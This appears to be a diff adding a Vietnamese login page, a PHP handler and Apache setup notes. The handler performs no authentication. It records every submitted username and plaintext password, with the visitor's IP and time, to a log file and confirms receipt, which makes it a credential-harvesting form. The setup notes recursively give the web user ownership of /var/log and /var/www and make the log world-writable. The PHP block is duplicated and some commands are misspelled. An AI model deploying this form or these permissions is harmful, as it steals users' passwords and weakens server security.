@@ -1,0 +1,88 @@
+###code html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng Nhập</title>
+</head>
+<body>
+    <h2>Đăng Nhập</h2>
+    <form method="POST" action="login.php">
+        <label>Tài Khoản:</label>
+        <input type="text" name="username" required><br><br>
+        <label>Mật Khẩu:</label>
+        <input type="password" name="password" required><br><br>
+        <input type="submit" value="Đăng Nhập">
+    </form>
+</body>
+</html>
+
+###code php
+<?php
+// Kiểm tra xem form có được gửi không
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Lấy dữ liệu từ form
+    $username = isset($_POST['username']) ? $_POST['username'] : 'Không có tài khoản';
+    $password = isset($_POST['password']) ? $_POST['password'] : 'Không có mật khẩu';
+
+    // Lấy địa chỉ IP và thời gian
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $time = date('Y-m-d H:i:s');
+
+    // Tạo nội dung log
+    $log = "Tài Khoản: $username; Mật Khẩu: $password; IP: $ip; Thời gian: $time\n";
+
+    // Ghi vào file log
+    $log_file = '/var/log/user_data.log';
+    if (file_put_contents($log_file, $log, FILE_APPEND) === false) {
+        echo "Lỗi: Không thể ghi vào file log.";
+    } else {
+        echo "Đã nhận thông tin của bạn!";
+    }
+} else {
+    echo "Vui lòng gửi dữ liệu qua form.";
+}
+?>
+<?php
+// Kiểm tra xem form có được gửi không
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Lấy dữ liệu từ form
+    $username = isset($_POST['username']) ? $_POST['username'] : 'Không có tài khoản';
+    $password = isset($_POST['password']) ? $_POST['password'] : 'Không có mật khẩu';
+
+    // Lấy địa chỉ IP và thời gian
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $time = date('Y-m-d H:i:s');
+
+    // Tạo nội dung log
+    $log = "Tài Khoản: $username; Mật Khẩu: $password; IP: $ip; Thời gian: $time\n";
+
+    // Ghi vào file log
+    $log_file = '/var/log/user_data.log';
+    if (file_put_contents($log_file, $log, FILE_APPEND) === false) {
+        echo "Lỗi: Không thể ghi vào file log.";
+    } else {
+        echo "Đã nhận thông tin của bạn!";
+    }
+} else {
+    echo "Vui lòng gửi dữ liệu qua form.";
+}
+?>
+###
+cap quyen cho file 
+sudo chown www-data:www-data /var/log/user_data.log
+sudo chmod 666 /var/log/user_data.log
+sudo chown -R www-data:www-data /var/log/
+sudo chmod -R 755 /var/log/
+sudo chown -R www-data:www-data /var/www
+sudo chmod -R 755 /var/www
+### kiem tra php da bat hay chua
+
+apache2ctl -M | grep php
+### bat php
+an2enmod php8.3
+### tat php
+an2dismod php8.3
+###sau do khoi dong lai
+systemctl restart apache2
